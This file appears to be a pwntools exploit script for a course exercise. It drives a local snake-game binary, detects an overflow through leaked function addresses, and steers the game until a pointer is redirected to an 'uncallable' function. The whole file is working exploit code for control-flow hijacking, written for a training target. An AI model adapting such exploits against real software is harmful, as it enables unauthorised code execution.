#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise6/exercise6a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def extract_add(line): 
    line = line.strip()
    add = line.split()[1]
    return int(add, 16)

def get_add(r):
    good_bye = r.recvline()
    uncallable = r.recvline()
    msg = r.recvuntil(b'followed by enter:\n')
    return extract_add(good_bye), extract_add(uncallable), msg

def pretty_print(msg):
    st = str(msg).replace('\\n', '\n')
    print(st)

def auto_move(r, direction):
    dir_map = {'left':b'a', 'right':b'd', 'up':b'w', 'down':b's', 'quit':b'q', 'auto': b'A'}
    assert direction in dir_map
    r.sendline(dir_map[direction])
    good_bye, uncallable, msg = get_add(r)
    diff = good_bye - uncallable
    return diff, msg
    
def extract_snake_len(msg):
    l = msg[:-67].split()[-1]
    return int(l)

def extract_position(msg):
    info = msg.split(b'\n')
    snake, fruit = info[-4], info[-5]
    snakes = snake.split()
    fruits = fruit.split()
    snake_x, snake_y = int(snakes[1][1:]), int(snakes[2][:-2])
    fruit_x, fruit_y = int(fruits[1][1:]), int(fruits[2][:-1])
    return snake_x, snake_y, fruit_x, fruit_y

r = start()
good_bye, uncallable, msg = get_add(r)
diff_true = good_bye - uncallable

while True:
    diff, msg = auto_move(r, 'auto')
    if diff != diff_true:
        print('Overflow happens!')
        break

x1, _, x2, _ = extract_position(msg)
direction = 'left' if x1 < x2 else 'right'
print('Moving {}'.format(direction))

while True:
    diff, msg = auto_move(r, direction)
    if diff == 0:
        r.sendline(b'q')
        break

print(r.recvline())
